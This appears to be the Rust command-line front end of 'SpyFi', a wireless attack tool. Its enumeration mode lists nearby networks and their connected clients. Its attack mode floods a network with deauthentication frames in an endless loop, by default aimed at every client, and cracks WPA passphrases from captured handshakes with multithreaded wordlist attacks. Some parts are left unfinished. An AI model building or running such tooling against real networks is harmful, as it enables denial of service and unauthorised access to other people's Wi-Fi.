//! # cli
// ! `cli` is a command line tool to control SpyFi. It allows you to 
//!  find nearest networks and perform actions such as disconnect them 
//! from the WiFi.

use std::collections::HashMap;
use std::{sync::mpsc,thread,cmp::min};
use clap::{Parser, ValueEnum, Args, Subcommand};
use wlan;
use threads::{
    ipc::{IPC,AttackMsg,IPCMessage,IOCommand},
    AttackThread, MonitorThread
};
use wpa::{self, NetworkInfo, ParsedFrame, AttackInfo};
use crypto;
use pcap;
use hex::encode;

const MAX_CHANNEL: usize = 11;
const INTERVAL: u64 = 500;
const PACKET_PER_CHANNEL: usize = 20; //num of packets to read per channel while sweeping

// contains the arguments of the CLI
// ## Description
// The struct contains the arguments of the CLI and description of the commands

#[derive(Parser, Debug)]
#[command(author,verbatim_doc_comment, version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands{
    Utility(Utility), 
    Enum(Enumerate), 
    Attack(Attack), 

}

// --------------------------- Utility Commands -------------------------------

#[derive(Args, Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct Utility{
    /// name of the wlan interface
    #[arg(short, long)]
    iface: Option<String>,

    ///generate psk 
    #[arg(long,requires="ssid",id="PASSPHRASE",group="utility")]
    psk: Option<String>,

    /// ssid
    #[arg(short, long,requires="PASSPHRASE")]
    ssid: Option<String>,

    /// list available interfaces
    #[arg(short, long,group="utility")]
    list: bool,

    /// set the interface mode
    #[arg(value_enum, requires = "iface",group="utility")]
    mode: Option<Mode>,

    /// set capturing channel
    #[arg(short, long, requires = "iface", value_parser = clap::value_parser!(u8).range(0..18))]
    channel: Option<u8>,
    
    #[arg(long, requires = "iface")]
    ch: bool,

}

impl Utility{
    fn parse(&self){
        if self.list{
            for iface in wlan::list_interfaces(){
                println!("{iface}");
            }
        }
        
        if let Some(channel) = self.channel {
            wlan::switch_iface_channel(self.iface.as_ref().unwrap(), channel).unwrap();
            println!("switched to channel {}", channel);
        }

        if self.ch{
            println!("{}",wlan::get_iface_channel(self.iface.as_ref().unwrap()).unwrap());
        }

        if let Some(mode) = self.mode {
            let iface = self.iface.as_ref().unwrap(); //TODO:remove unwraps
            match mode {
                Mode::Managed => {
                    if let Err(err) = wlan::toggle_monitor_state(iface, false) {
                        println!("Error: {}", err);
                    }
                    println!("{} switched to managed mode", iface);
                }
                Mode::Monitor => {
                    if let Err(err) = wlan::toggle_monitor_state(iface, true) {
                        println!("Error: {}", err);
                    };

                    println!("{} switched to monitor mode", iface);
                }
            }
        }

        if let Some(passphrase) = self.psk.as_ref() {
            let ssid = self.ssid.as_ref().unwrap();
            let psk = crypto::generate_psk(&passphrase, ssid);
            println!("{}",encode(psk));
        }
    }

}

/// Enum with all modes of the interface
#[derive(Copy, Clone, Debug, PartialEq, Eq, PartialOrd, Ord, ValueEnum)]
enum Mode {
    ///managed mode
    Managed,
    ///monitor mode
    Monitor,
}

// --------------------------- Enumerate Commands -----------------------------

//TODO: help decriptions
#[derive(Args, Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct Enumerate{

    /// name of the wlan interface
    #[arg(short, long)]
    iface: String,
    
    ///timeout in seconds
    #[arg(short, long,default_value_t=60)]
    timeout: u32,

    ///dump results into an outputfile
    #[arg(short,long)]
    outputfile: Option<String>,

    ///use channel sweeping
    #[arg(short,long)]
    sweep:bool,
}


impl Enumerate{
    fn parse(&self){

        let init_time = std::time::Instant::now();
        let timeout = std::time::Duration::from_secs(self.timeout as u64);

        let iface = self.iface.clone();
        let mut channel: u8 = wlan::get_iface_channel(&iface).unwrap();
        let mut networks:HashMap<String,NetworkInfo> = HashMap::new();
       
        println!("\n[+] Listening on: {iface}");
        if self.sweep{
            println!("[+] Sweep mode: ON");
        }else{
            println!("[+] Channel: {channel}");
        }
       
        //spawn monitor thread
        let (thread_tx,main_rx) = mpsc::channel(); 
        let (main_tx,thread_rx) = mpsc::channel(); 
        thread::spawn(move ||{
            MonitorThread::init(&iface,thread_rx,thread_tx).run();
        });
        if self.sweep{
            main_tx.send(IPCMessage::IOCommand(IOCommand::Sweep));
        }

        while init_time.elapsed() <= timeout {
            //read discovered networks from the Monitor thread
            if let Ok(msg) = main_rx.try_recv(){
                if let IPCMessage::Message(net_info) = msg{
                    networks = net_info;
                }
            }
            networks_pretty_print(&networks);
        }
    
        //kill the Monitor thread
        main_tx.send(IPCMessage::EndCommunication); 
        if self.outputfile.is_some(){
            todo!("print to file");
        }

    }
}

// ----------------------------- Attack Commands ------------------------------

#[derive(Args, Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct Attack{
    ///attack type
    #[arg(short,long="type",name="ATTACKTYPE")]
    attack: AttackType,

    ///interface
    #[arg(long,short,group="source",
        required_if_eq("ATTACKTYPE","dos"),
    )]
    iface: Option<String>,
   
    ///capture file
    #[arg(short,long,group="source",
        required_if_eq("ATTACKTYPE","dict"),
    )]
    capture: Option<String>,

    ///number of threads to use for dictionary/bruteforce attack
    #[arg(short,long,default_value_t=1,value_parser = clap::value_parser!(u32).range(1..201))]
    threads:u32,


    ///target MAC for DoS attack [default: broadcast]
    #[arg(long)]
    target: Option<String>,

    ///network's SSID. Might be used instead of BSSID and we will try to get it (Unrecommended)
    #[arg(
        short, 
        long,
        required_if_eq("ATTACKTYPE","dict"),
        requires = "source"
    )]
    ssid: Option<String>,

    ///network's BSSID
    #[arg(
        short, long,
        required = true,
        requires = "source"
    )]
    bssid: Option<String>,

    ///use channel sweeping
    #[arg(long,requires="iface")]
    sweep:bool,

    ///wordlist
    //TODO: require wordlist or phones
    #[arg(long,group="dict",
    required_if_eq("ATTACKTYPE","dict"),
    )]
    wordlist: Option<String>,
}


#[derive(ValueEnum, Debug, Ord, Eq, PartialOrd, Clone, PartialEq)]
enum AttackType{
    ///dictionary file
    Dict, 
    /// Deauth attack
    Dos,
}

impl Attack{
    fn parse(&self){
        match self.attack{
            AttackType::Dos =>{
                //read target for the print
                let target = self.target.as_deref().unwrap_or("broadcast"); 
                let bssid = self.bssid.as_ref().unwrap();
                let iface = self.iface.as_ref().unwrap();
                println!("sending deauth to {target}");
                let mut channel:u8 = 1;
                loop{
                    if self.sweep{
                        wlan::switch_iface_channel(iface, channel);
                        channel = aux::modulos((channel+1) as i32,(MAX_CHANNEL+1) as i32) as u8;
                        println!("switched to channel {channel}");
                    }
                    for _ in 1..64{
                        wpa::send_deauth(iface, bssid, self.target.clone());
                    }
                    
                }

            },
            AttackType::Dict =>{
                //TODO: REALTIME CAPTURE MODE
                
                //capture mode
                if self.capture.is_some(){
                    let path = std::path::Path::new(self.capture.as_ref().unwrap());
                    let pcap = pcap::Capture::from_file(path);
                    let ssid = self.ssid.as_ref().unwrap();
                    let bssid = self.bssid.as_ref().unwrap();
                    
                    //read HS from capture file
                    let hs;
                    match pcap{
                        Ok(cap) =>{
                            hs = wpa::get_hs_from_file(cap, ssid, bssid).unwrap();
                        },
                        _ =>{
                            println!("failed to open pcap:{}",self.capture.as_ref().unwrap());
                            return;
                        } 
                    }        
                   
                    let (thread_tx,main_rx) = mpsc::channel();
                    let (main_tx,thread_rx) = mpsc::channel(); 

                    let main_ipc:IPC<AttackMsg> = IPC{
                        tx: main_tx,
                        rx: main_rx,
                    };

                    let thread_ipc:IPC<AttackMsg> = IPC{
                        tx: thread_tx,
                        rx: thread_rx,
                    };
                    
                    let attack_info;
                    let wordlist = self.wordlist.as_ref().unwrap();
                    attack_info = AttackInfo::new(hs,wordlist, self.threads as u8);
                    thread::spawn(move||{AttackThread::init(thread_ipc,attack_info).unwrap().run()});

                    println!("\x1b[?25l"); //hide cursor
                    let mut lines_count = 1;
                    loop{
                        print!("\x1b[{}A",lines_count);//move up the cursor
                        lines_count = 1;
                        match main_ipc.rx.recv().unwrap(){
                            IPCMessage::Attack(AttackMsg::Progress(progress)) =>{
                                println!("[*] progress: {}/{}",progress.num_of_attempts,progress.size_of_wordlist);
                                for i in 0..min(progress.passwords_attempts.len()-1,10){
                                    println!("{:-100}",progress.passwords_attempts[i]);
                                    lines_count +=1;
                                }
                            },
                            IPCMessage::Attack(AttackMsg::Password(password)) =>{
                                println!("found password: {}",password);
                                print!("\x1b[?25h"); //restore cursor
                                main_ipc.tx.send(IPCMessage::Attack(AttackMsg::Abort));
                                return;
                            },
                            _=>{break;}
                        }
                    }
                    main_ipc.tx.send(IPCMessage::Attack(AttackMsg::Abort));
                    println!("{:-100}","[!] Exhausted.");
                    print!("\x1b[?25h"); //restore cursor
                }


            },
        } 
    }
}

pub fn run() {
    let args = Cli::parse(); //parse arguments

    
    match args.command {
        Commands::Utility(u) =>{
            u.parse();
        },

        Commands::Enum(e) =>{
            e.parse();
        },

        Commands::Attack(a) =>{
            a.parse();
        },
        _ =>{
            println!("invalid");
        }
        
    }
}

// ----------------------------------- Aux ------------------------------------


fn write_networks_to_file(path:&str,networks:&HashMap<String,NetworkInfo>){
    todo!();
}

fn networks_pretty_print(networks:&HashMap<String,NetworkInfo>){
    //hide cursor
    println!("\x1b[?25l");
    println!(" {:-^68} "," Networks ");
    println!("|     SSID     | CHANNEL |       BSSID      | SIGNAL |    CLIENTS    |");
    let mut lines_num = 4; //tracks how many lines were print
    for (_,station) in networks{
        println!(" --------------------------------------------------------------------");
        print!("|{:^14}|{:^9}|{:^18}|{:^8}|",
            station.ssid, 
            station.channel.unwrap_or(0),
            hex::encode(station.bssid),
            format!("{} dBm",station.signal_strength.unwrap_or(0)),
        );
        lines_num += 2;

        if !station.clients.is_empty(){
            println!("{:^15}|",station.clients[0].mac);
            for client in &station.clients[1..]{
                println!("{:>67}  |",client.mac);
            }
            lines_num += station.clients.len()-1;
        }else{
            println!("               |");
        }
    }
    println!(" --------------------------------------------------------------------");
    //move up the cursor
    print!("\x1b[{}A",lines_num);
    print!("\x1b[?25h"); //restore the cursor
}
